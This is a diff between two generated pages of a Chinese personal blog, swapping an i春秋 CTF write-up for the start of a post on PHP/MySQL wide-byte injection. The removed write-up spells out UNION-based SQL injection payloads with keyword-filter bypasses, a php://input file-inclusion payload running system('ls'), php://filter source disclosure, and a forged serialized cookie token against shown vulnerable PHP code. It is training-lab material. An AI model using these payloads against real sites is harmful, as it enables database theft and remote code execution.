@@ -94,7 +94,7 @@
 
 
 
-  <meta name="keywords" content="ctf," />
+  <meta name="keywords" content="php," />
 
 
 
@@ -105,28 +105,17 @@
 
 
 
-<meta name="keywords" content="ctf">
+<meta name="keywords" content="php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="i春秋writeup">
-<meta property="og:url" content="http://yoursite.com/2018/10/05/ichunqiu/index.html">
+<meta property="og:title" content="phpmysql宽字节注入">
+<meta property="og:url" content="http://yoursite.com/2018/10/18/kuanzijie/index.html">
 <meta property="og:site_name" content="绝世狂龙">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-e2854f9bc4a5088f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/9113981-093495bda8cf14c4.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-72644ae43cc33155.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-1d91fd15261e23b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-f72cc722e2f32688.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-768f8186fad8ad0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-b6a3a803b9c21547.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-c4ad30bfe09226b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-6a906167df951310.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-9a6ebe705a3fe7a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-55606b0ae1dbd066.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-d0a73908a0f19a6b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-10-05T10:01:41.897Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-13dcb30a52cc1799.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-10-18T02:22:41.477Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="i春秋writeup">
-<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9113981-e2854f9bc4a5088f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta name="twitter:title" content="phpmysql宽字节注入">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9113981-13dcb30a52cc1799.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -156,14 +145,14 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/05/ichunqiu/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/18/kuanzijie/"/>
 
 
 
 
 
 
-  <title>i春秋writeup | 绝世狂龙</title>
+  <title>phpmysql宽字节注入 | 绝世狂龙</title>
   
 
 
@@ -320,7 +309,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/05/ichunqiu/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/18/kuanzijie/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="berlin">
@@ -337,7 +326,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">i春秋writeup</h1>
+          <h1 class="post-title" itemprop="name headline">phpmysql宽字节注入</h1>
         
 
         <div class="post-meta">
@@ -349,8 +338,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-05T17:21:51+08:00">
-                2018-10-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-18T10:22:18+08:00">
+                2018-10-18
               </time>
             
 
@@ -409,32 +398,7 @@
       
 
       
-        <p><img src="https://upload-images.jianshu.io/upload_images/9113981-e2854f9bc4a5088f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><a id="more"></a></p>
-<h2 id="1-sql"><a href="#1-sql" class="headerlink" title="1.sql"></a>1.sql</h2><p>题目地址<br><a href="http://baabb3c37fcb429b9a2a71dbe623a29ee49724ec66094043.game.ichunqiu.com" target="_blank" rel="noopener">http://baabb3c37fcb429b9a2a71dbe623a29ee49724ec66094043.game.ichunqiu.com</a></p>
-<p>爆破数据库名 ?id=1 unio&lt;&gt;n sele&lt;&gt;ct 1,database(),3<br>爆表： ?id=1 union selec&lt;&gt;t 1,table_name,3 from information_schema.tables where table_schema=’sqli’<br>爆列：  ?id=1 unio&lt;&gt;n sele&lt;&gt;ct 1,column_name,3 fro&lt;&gt;m information_schema.columns where table_name=’info’<br>爆值flag:  ?id=1 union selec&lt;&gt;t 1,flAg_T5ZNdrm,3 from info</p>
-<h2 id="2-include"><a href="#2-include" class="headerlink" title="2.include"></a>2.include</h2><p>题目地址<br><a href="http://2c5ab5a1abe64d98a4030b4aab717039d05000ed41844554.game.ichunqiu.com/" title="http://2c5ab5a1abe64d98a4030b4aab717039d05000ed41844554.game.ichunqiu.com" target="_blank" rel="noopener">http://2c5ab5a1abe64d98a4030b4aab717039d05000ed41844554.game.ichunqiu.com</a></p>
-<p>看一下题目，完全没防护的文件包含：</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/9113981-093495bda8cf14c4.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
-<p>直接构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">path=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">post内容：<span class="meta">&lt;?php</span> <span class="keyword">echo</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>看一下有哪些文件：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113981-72644ae43cc33155.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113981-1d91fd15261e23b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>再利用<code>?path=php://filter/read=convert.base64-encode/resource=dle345aae.php</code></p>
-<p>读取文件内容，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/9113981-f72cc722e2f32688.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113981-768f8186fad8ad0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<h2 id="3-Login"><a href="#3-Login" class="headerlink" title="3.Login"></a>3.Login</h2><p><a href="https://www.ichunqiu.com/battalion?q=2725" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion?q=2725</a><br>这题看到之后首先是sql注入的想法，不过很快破灭了，没有回显瞎注<br>查看源代码后，发现<br><img src="https://upload-images.jianshu.io/upload_images/9113981-b6a3a803b9c21547.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>猜测账号密码是test1，果然进去了<br>进入member.php 页面 但是没用发现可用信息<br>于是burp suite拦截包看一下<br><img src="https://upload-images.jianshu.io/upload_images/9113981-c4ad30bfe09226b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>现在response 中有可疑参数 show</p>
-<p>于是我们在请求段加入 show :1;<br><img src="https://upload-images.jianshu.io/upload_images/9113981-6a906167df951310.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>发现返回了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line">    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $where;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;where))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;select(<span class="keyword">$this</span>-&gt;where);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($where)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $sql = mysql_query(<span class="string">'select * from user where '</span>.$where);</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_array($sql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">        $db = <span class="keyword">new</span> db();</span><br><span class="line">        $row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br><span class="line">        <span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"(鈺�碘枴鈥�)鈺傅鈹粹攢鈹� "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">'Location: index.php?error=1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> --&gt;</span><br></pre></td></tr></table></figure></p>
-<p>得知要得到flag需要满足 <code>$login[&#39;user&#39;] === &#39;ichunqiu&#39;</code></p>
-<p>而user被<code>$login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));</code>处理过</p>
-<p>我们重新编写一个程序解密即可<br><img src="https://upload-images.jianshu.io/upload_images/9113981-9a6ebe705a3fe7a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/9113981-55606b0ae1dbd066.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>将结果添加到cookie中的token中然后发过去即可得到flag<br><img src="https://upload-images.jianshu.io/upload_images/9113981-d0a73908a0f19a6b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<blockquote>
-<p>函数说明：<br>gzcompress() - 压缩字符串<br>string gzcompress （string $data [，int $level= -1 [，int $encoding= ZLIB_ENCODING_DEFLATE ]]）<br>此函数使用ZLIB 数据格式压缩给定的字符串。<br>参数<br>data : 要压缩的数据。<br>level : 压缩程度。可以给出0表示无压缩，最高压缩为9。如果使用-1，则使用zlib库的默认压缩，即6。<br>encoding : 一个ZLIB_ENCODING_*常数。</p>
-</blockquote>
-<blockquote>
-<p>gzuncompress - 解压缩压缩字符串<br>string gzuncompress （string $data [，int $length= 0 ]）<br>此函数解压缩压缩字符串。<br>data: 由<a href="http://www.php.net/manual/en/function.gzcompress.php" target="_blank" rel="noopener">gzcompress（）</a>压缩的数据。<br>length: 要解码的最大数据长度。</p>
-</blockquote>
+        <p><img src="https://upload-images.jianshu.io/upload_images/9113981-13dcb30a52cc1799.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.jpg"><br><a id="more"></a></p>
 
       
     </div>
@@ -451,12 +415,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2018/10/05/ichunqiu/">i春秋writeup</a></p>
+  <p><span>本文标题:</span><a href="/2018/10/18/kuanzijie/">phpmysql宽字节注入</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 berlin 的个人博客">berlin</a></p>
-  <p><span>发布时间:</span>2018年10月05日 - 17:10</p>
-  <p><span>最后更新:</span>2018年10月05日 - 18:10</p>
-  <p><span>原始链接:</span><a href="/2018/10/05/ichunqiu/" title="i春秋writeup">http://yoursite.com/2018/10/05/ichunqiu/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2018/10/05/ichunqiu/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2018年10月18日 - 10:10</p>
+  <p><span>最后更新:</span>2018年10月18日 - 10:10</p>
+  <p><span>原始链接:</span><a href="/2018/10/18/kuanzijie/" title="phpmysql宽字节注入">http://yoursite.com/2018/10/18/kuanzijie/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2018/10/18/kuanzijie/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -497,7 +461,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
           
         </div>
       
@@ -510,8 +474,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/05/pyweb/" rel="next" title="初识python网络编程">
-                <i class="fa fa-chevron-left"></i> 初识python网络编程
+              <a href="/2018/10/05/ichunqiu/" rel="next" title="i春秋writeup">
+                <i class="fa fa-chevron-left"></i> i春秋writeup
               </a>
             
           </div>
@@ -519,10 +483,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/18/kuanzijie/" rel="prev" title="phpmysql宽字节注入">
-                phpmysql宽字节注入 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -585,17 +545,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -727,22 +678,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-sql"><span class="nav-number">1.</span> <span class="nav-text">1.sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-include"><span class="nav-number">2.</span> <span class="nav-text">2.include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Login"><span class="nav-number">3.</span> <span class="nav-text">3.Login</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
